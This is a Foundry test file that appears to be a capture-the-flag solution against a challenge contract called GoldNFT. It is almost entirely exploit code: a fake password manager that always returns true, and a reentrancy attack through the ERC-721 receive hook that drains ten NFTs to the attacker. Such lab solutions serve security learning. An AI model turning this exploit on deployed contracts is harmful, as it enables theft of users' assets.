// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/GoldNFT.sol";
import {IERC721Receiver} from "lib/openzeppelin-contracts/contracts/interfaces/IERC721Receiver.sol";
import {IERC721} from "lib/openzeppelin-contracts/contracts/interfaces/IERC721.sol";

contract PassManager is IPassManager{
    function read(bytes32) external pure returns(bool){
        return true;
    }
}

contract AttackerContract is IERC721Receiver {
    GoldNFT private immutable nft;
    bytes32 private immutable password;
    address private immutable manager;
    address private immutable attacker;
    uint256 private count;
    constructor(GoldNFT _nft , bytes32 _password , address _manager, address _attacker){
        nft = _nft;
        password = _password;
        manager = _manager;
        attacker = _attacker; 
    }

    function attack() public {
        nft.takeONEnft(password , manager);
    }

    function onERC721Received(
        address /*operator*/,
        address from,
        uint256 tokenId,
        bytes calldata /*data*/
    ) external returns (bytes4){
        console.log("From address : ", from);

        if(count < 10 ){
            count++;
            nft.takeONEnft(password, manager);
            IERC721(nft).transferFrom(address(this), attacker, tokenId);
        }
        return this.onERC721Received.selector;
    }


}

contract Hack is Test {
    GoldNFT nft;
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");
    PassManager pass;
    function setUp() external { 
        nft = GoldNFT(deployCode("src/GoldNFT.sol:GoldNFT"));
        pass = new PassManager();
        vm.label(address(nft),"NFT Contract address");
        vm.label(address(pass), "Pass Contract Address");
    }

    function test_Attack() public {
        vm.startPrank(hacker);
        AttackerContract attackerContract = new AttackerContract(nft,bytes32(uint256(1)),address(pass), hacker);
        attackerContract.attack();
        vm.stopPrank();
        // solution
        assertEq(nft.balanceOf(hacker), 10);
    }
}